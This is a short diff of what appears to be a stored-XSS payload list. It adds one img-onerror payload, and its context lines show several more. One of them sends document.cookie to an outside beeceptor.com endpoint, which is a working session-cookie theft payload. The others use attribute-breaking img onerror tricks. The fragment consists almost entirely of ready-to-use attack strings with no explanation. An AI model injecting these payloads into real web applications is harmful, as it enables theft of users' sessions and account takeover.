@@ -13,6 +13,8 @@ Stored XSS
 
 <img src=x onerror=this.src='https://gopal.free.beeceptor.com/?'+document.cookie;>
 
+<img/src/onerror=alert(1)> 
+
 "><img src=x onerror=alert(101)>
 
 "><img src=x onerror=alert(document.cookie)>
